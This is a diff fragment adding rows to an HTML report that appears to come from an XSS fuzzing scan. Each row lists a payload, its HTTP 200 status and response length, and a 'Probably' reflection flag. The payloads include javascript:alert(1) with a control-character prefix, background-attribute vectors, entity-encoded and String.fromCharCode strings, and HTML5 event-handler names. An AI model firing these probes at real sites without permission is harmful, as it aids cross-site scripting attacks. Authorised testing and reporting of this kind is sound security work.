+        <td>OCTYPE html&gt;<br>&lt;html l</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>" &amp;#14;  javascript:alert(1)"</td>
+        <td>200</td>
+        <td>119729</td>
+        <td>" &amp;#14;  javascript:alert(1)"</td>
+        <td>OCTYPE html&gt;<br>&lt;html lang="en-</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;TABLE BACKGROUND=""&gt;</td>
+        <td>200</td>
+        <td>119744</td>
+        <td>&lt;TABLE BACKGROUND=""&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;html l</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;TABLE&gt;&lt;TD BACKGROUND=""&gt;</td>
+        <td>200</td>
+        <td>119762</td>
+        <td>&lt;TABLE&gt;&lt;TD BACKGROUND=""&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;html lang=</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;DIV STYLE="background-image: url()"&gt;</td>
+        <td>200</td>
+        <td>119749</td>
+        <td>&lt;DIV STYLE="background-image: url()"&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;html lang="en-US"&gt;<br>&lt;h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&amp;#106;&amp;#97;&amp;#118;&amp;#97;</td>
+        <td>200</td>
+        <td>119741</td>
+        <td>&amp;#106;&amp;#97;&amp;#118;&amp;#97;</td>
+        <td>OCTYPE html&gt;<br>&lt;html la</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&amp;#49;&amp;#41;&gt;</td>
+        <td>200</td>
+        <td>119711</td>
+        <td>&amp;#49;&amp;#41;&gt;</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>String.fromCharCode(88,83,83)</td>
+        <td>200</td>
+        <td>119717</td>
+        <td>String.fromCharCode(88,83,83)</td>
+        <td>OCTYPE html&gt;<br>&lt;html lang="en-</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>offline</td>
+        <td>200</td>
+        <td>119710</td>
+        <td>offline</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onbeforeonload</td>
+        <td>200</td>
+        <td>119695</td>
+        <td>onbeforeonload</td>
+        <td>OCTYPE html&gt;<br></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onbeforeprint</td>
+        <td>200</td>
+        <td>119699</td>
+        <td>onbeforeprint</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>oncanplay</td>
+        <td>200</td>
+        <td>119687</td>
+        <td>oncanplay</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>oncanplaythrough</td>
+        <td>200</td>
+        <td>119685</td>
+        <td>oncanplaythrough</td>
+        <td>OCTYPE html&gt;<br>&lt;h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>ondurationchange</td>
+        <td>200</td>
+        <td>119720</td>
+        <td>ondurationchange</td>
+        <td>OCTYPE html&gt;<br>&lt;h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onemptied</td>
+        <td>200</td>
+        <td>119710</td>
+        <td>onemptied</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onformchange</td>
+        <td>200</td>
+        <td>119706</td>
+        <td>onformchange</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>oninvalid</td>
+        <td>200</td>
+        <td>119687</td>
+        <td>oninvalid</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onloadeddata</td>
+        <td>200</td>
+        <td>119687</td>
+        <td>onloadeddata</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onloadedmetadata</td>
+        <td>200</td>
+        <td>119712</td>
+        <td>onloadedmetadata</td>
+        <td>OCTYPE html&gt;<br>&lt;h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onloadstart</td>
+        <td>200</td>
+        <td>119710</td>
+        <td>onloadstart</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onpagehide</td>
+        <td>200</td>
+        <td>119679</td>
+        <td>onpagehide</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onpageshow</td>
+        <td>200</td>
+        <td>119710</td>
+        <td>onpageshow</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onplay</td>
+        <td>200</td>
+        <td>119646</td>
+        <td>onplay</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onplaying</td>
+        <td>200</td>
+        <td>119714</td>
+        <td>onplaying</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onratechange</td>
+        <td>200</td>
+        <td>119728</td>
+        <td>onratechange</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onseeked</td>
+        <td>200</td>
+        <td>119673</td>
+        <td>onseeked</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onseeking</td>
+        <td>200</td>
+        <td>119681</td>
+        <td>onseeking</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onsuspend</td>
+        <td>200</td>
+        <td>119679</td>
+        <td>onsuspend</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onwaiting</td>
+        <td>200</td>
+        <td>119710</td>
+        <td>onwaiting</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onwheel</td>
+        <td>200</td>
+        <td>119714</td>
+        <td>onwheel</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>http://</td>
+        <td>200</td>
+        <td>119662</td>
+        <td>http://</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+</table>
